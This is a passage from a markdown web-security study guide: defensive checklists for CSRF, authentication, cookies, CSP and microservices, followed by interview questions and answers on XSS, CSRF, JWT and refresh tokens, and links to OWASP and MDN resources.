### CSRF Prevention
- ✅ Use SameSite cookies (`strict` or `lax`)
- ✅ Implement CSRF tokens for state-changing operations
- ✅ Validate Origin/Referer headers
- ✅ Use custom headers for AJAX requests

### Authentication
- ✅ Use HTTPS everywhere
- ✅ Implement refresh token flow
- ✅ Store tokens securely (httpOnly cookies)
- ✅ Use short-lived access tokens (15 min)
- ✅ Implement token revocation

### Cookies
- ✅ Set HttpOnly flag (prevent XSS)
- ✅ Set Secure flag (HTTPS only)
- ✅ Set SameSite (prevent CSRF)
- ✅ Use appropriate expiration
- ✅ Minimize cookie data

### CSP
- ✅ Start with report-only mode
- ✅ Use nonces for inline scripts
- ✅ Avoid 'unsafe-inline' and 'unsafe-eval'
- ✅ Set frame-ancestors to prevent clickjacking
- ✅ Monitor violation reports

### Microservices
- ✅ Use API Gateway for centralized auth
- ✅ Implement proper CORS configuration
- ✅ Use short-lived service tokens
- ✅ Implement rate limiting
- ✅ Use correlation IDs for tracing

---

## Interview Tips

### Common Questions

**Q: "What's the difference between XSS and CSRF?"**
A: XSS allows attackers to inject malicious scripts that execute in victim's browser, stealing data or performing actions. CSRF tricks victim's browser into making unauthorized requests to a site where they're authenticated, using their credentials to perform actions without their knowledge.

**Q: "How does React prevent XSS?"**
A: React automatically escapes all values rendered in JSX, converting special characters to HTML entities. However, you're vulnerable if you use `dangerouslySetInnerHTML`, `href` with `javascript:` protocol, or directly manipulate DOM.

**Q: "JWT vs Session - which is more secure?"**
A: Sessions are generally more secure for web apps (httpOnly cookies, easy revocation), while JWT is better for APIs and microservices (stateless, scalable). Best approach: JWT in httpOnly cookies with refresh token flow.

**Q: "What's the purpose of refresh tokens?"**
A: Allow short-lived access tokens (better security) without forcing users to re-authenticate constantly (better UX). Refresh tokens are long-lived but used infrequently and can be revoked.

**Q: "How do you handle authentication in microservices?"**
A: Use API Gateway for centralized authentication, validate tokens at gateway, propagate user context to services via headers or service tokens, implement mTLS for service-to-service communication.

---

## Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Content Security Policy Reference](https://content-security-policy.com/)
- [JWT.io](https://jwt.io/)
- [React Security Best Practices](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml)